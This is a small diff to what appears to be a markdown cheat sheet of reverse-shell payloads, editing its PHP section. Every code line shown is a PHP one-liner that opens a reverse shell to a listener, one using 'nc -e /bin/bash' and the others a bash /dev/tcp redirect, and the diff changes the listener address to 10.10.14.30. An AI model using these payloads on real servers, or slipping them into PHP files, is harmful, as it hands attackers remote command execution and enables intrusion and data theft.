@@ -136,8 +136,10 @@ php(file)
 
 ```Php
 <?php system(\"nc -e /bin/bash 192.168.1.100 80\"); ?>
+```
 
-<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/80 0>&1'");?>
+```
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.30/80 0>&1'");?>
 ```
 
 ### :open_file_folder: Cron jobs
